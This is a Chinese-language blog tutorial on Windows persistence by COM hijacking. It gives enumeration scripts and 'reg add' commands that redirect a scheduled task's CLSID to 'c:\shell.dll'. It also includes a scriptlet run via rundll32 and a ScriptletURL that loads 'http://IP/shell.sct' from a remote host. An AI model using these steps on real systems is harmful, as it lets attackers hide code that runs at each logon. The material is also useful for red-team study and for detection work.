---
title: Persistence COM Hijacking
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/COM-Hijacking
tags:
  - Windows
  - Persistence
  - COM-Hijacking
slug: English-Preview
---
> Persistence COM Hijacking
<!--more-->

# COM Hijacking

## COM 组件对象模型

COM 是一个独立于平台的分布式面向对象的系统，用于创建可以交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档的基础技术，) 和 ActiveX (支持 Internet 的组件) 技术

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/component-object-model--com--portal

## CLSID Key

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/clsid-key-hklm

```cmd
# 常见的CLSID

{20D04FE0-3AEA-1069-A2D8-08002B30309D} # 我的电脑
{450D8FBA-AD25-11D0-98A8-0800361B1103} # 我的文档
{645FF040-5081-101B-9F08-00AA002F954E} # 回收站
```

## 劫持原理

一般来说，COM组件在被调用加载过程中会寻找注册表三个位置：

1. HKCU\Software\Classes\CLSID\{CLSID}
2. HKCR\CLSID\{CLSID}
3. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\{CLSID}

每一个CLSID键下会有一个基本子键`LocalServer32`或`InprocServer32`，它两的键值代表该COM组件提供的功能。其中`LocalServer32`的默认键值一般表示可执行文件(exe)的路径，而`InprocServer32`的默认键值表示动态链接库(DLL)的路径。也可以有其他的子键，`ThreadingModel`作用是标记该DLL的线程模型

所以，根据COM调用加载过程可以得出理论上可行的劫持方案：

- HKCR中有，而HKCU中没有，只需要在HKCU中注册即可劫持HKCR中的COM服务
- 修改掉`LocalServer32`或`InprocServer32`的键值
- 替换掉`LocalServer32`或`InprocServer32`的键值中的文件

基于这种思路，可以利用脚本[https://github.com/earthmanET/COM-Hijacker](https:) 用于枚举可能存在COM劫持的`LocalServer32`或`InprocServer32`

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/inprocserver32

```cmd
# 常被利用的键值
InprocServer/InprocServer32 # 动态链接库文件(dll)的路径
LocalServer/LocalServer32 # 可执行文件(exe)的路径
TreatAs
ProgID

# 注册表项
HKEY_CURRENT_USER\Software\Classes\CLSID
HKEY_LOCAL_MACHINE\Software\Classes\CLSID
```

## Discover COM Keys – Hijack

识别可用于进行 COM 劫持的 COM 密钥很简单，需要使用 [Process Monitor](https://download.sysinternals.com/files/ProcessMonitor.zip) 来发现缺少 CLSID 且不需要提升权限 (HKCU) 的 COM 服务

Process Monitor 可以配置以下过滤器

```cmd
Operation is RegOpenKey
Result is NAME NOT FOUND
Path ends with InprocServer32
Exclude if path starts with HKLM
```

导出结果之后，使用[acCOMplice](https://github.com/nccgroup/acCOMplice)的 PowerShell 脚本提取CSV中的可劫持COM Keys

```powershell
Import-Module COMHijackToolkit.ps1
Extract-HijackableKeysFromProcmonCSV -CSVfile .\result.CSV
```

或者直接检索系统上存在的缺失库及其 CLSID

```powershell
Find-MissingLibraries
```

PowerShell 脚本

```powershell
$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
$inproc | ForEach {$_.LocalServer32} > values.txt
$paths = gc .\values.txt
foreach ($p in $paths){$p;cmd /c dir $p > $null}
```

同样，以下 PowerShell 代码也可以枚举 InprocServer32 类

```powershell
$inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
$paths = $inproc | ForEach {$_.InprocServer32}
foreach ($p in $paths){$p;cmd /c dir $p > $null}
```

## Discover COM Keys – Scheduled Task

PowerShell 脚本 ( [Get-ScheduledTaskComHandler](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1) )，它可以检查主机上所有在用户登录时执行的计划任务，并找出哪些容易受到 COM 劫持

```powershell
Import-Module .\Get-ScheduledTaskComHandler.ps1
Get-ScheduledTaskComHandler
```

参数“ **PersistenceLocations** ”将检索容易受到 COM 劫持的计划任务，这些任务可用于持久性，并且不需要提升权限。CLSID 和关联的 DLL 也将显示在输出中

```powershell
Get-ScheduledTaskComHandler -PersistenceLocations
```

调用“ *schtasks* ”检索文件的内容

```powershell
schtasks /query /FO list | findstr "CacheTask"

# 获取 CLSID
schtasks /query /XML /TN "\Microsoft\Windows\Wininet\CacheTask"
schtasks /query /XML /TN "\Microsoft\Windows\CertificateServicesClient\UserTask"

```

## InprocServer32

“ **InprocServer32** ”（进程内服务器）注册表项指示 COM 库位于磁盘上的位置并定义线程模型

为 "CacheTask" 重新创建注册表项结构并指向任意 DLL：上传DLL；设置子键“ **InprocServer32** ”指向 DLL 的位置

由于“ **CacheTask** ”默认在登录期间启动，因此任何用户代码都将在登录期间永久执行（持久性）

```cmd
# Usage
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32

# Windows 7 需要 Administrator 权限 ；Windows 10 需要 TrustedInstaller 权限
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32 /v "" /t REG_SZ /d "<path to dll>" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32" /v "" /t REG_SZ /d "c:\shell.dll" /f
```

“ **ScriptletURL** ”注册表项定义了调用 COM 类时将获取并执行的任意 .sct 文件的远程位置，执行无文件持久化

```scriptlet
<?XML version="1.0"?>
<scriptlet>
 
<registration
    description="Pentest.Lab"
    progid="Pentest.Lab"
    version="1"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
    >
</registration>
 
<script language="JScript">
<![CDATA[
 
        var r = new ActiveXObject("WScript.Shell").Run("pentestlab.exe");
     
     
]]>
</script>
 
</scriptlet>

# Usage
键值设置为：http://IP/shell.sct
```

执行以下命令将调用 COM 类并直接执行有效负载

```cmd
# Usage
rundll32.exe -sta {CLSID}

rundll32.exe -sta {0358b920-0ac7-461f-98f4-58e32cd89148}
```

## LocalServer32

**LocalServer32**注册表项指定外部 COM 对象在系统上的位置。这些通常是具有可执行文件形式的应用程序。

以下 COM 类 ID 已在枚举可劫持密钥期间检索到，可用于执行任意可执行文件

```powershell
HKEY_CLASSES_ROOT\CLSID\{45EAE363-122A-445A-97B6-3DE890E786F8}\LocalServer32
```

将应用程序的默认值替换为任意可执行文件实现劫持，还需要通过执行以下 PowerShell 命令来激活 ClassID，否则 COM 对象将被禁用

```powershell
[activator]::CreateInstance([type]::GetTypeFromCLSID("45EAE363-122A-445A-97B6-3DE890E786F8"))
```

## TreatAs/ProgID

“ *TreatAs* ”是一个注册表项，它允许一个 CLSID 被另一个 CLSID 模拟。这可用于将 COM 对象重定向到另一个 COM 对象

1. 使用所选的目标 COM 服务器在 HKCU 注册表配置单元中创建恶意 CLSID。
2. 通过添加指向恶意 CLSID 的“ *TreatAs* ”子项来劫持合法 CLSID 。

“ *ProgID* ”是 COM 对象的友好名称，它不是唯一的。以下注册表项将 ProgID 解析为 CLSID。

- HKCU\Software\Classes
- HKLM\Software\Classes

这意味着当应用程序（客户端）激活 COM 对象（类）时，操作系统将通过最初读取以下注册表位置来解析关联的“ *ProgID ”：*

- HKCU\Software\Classes\ProgID
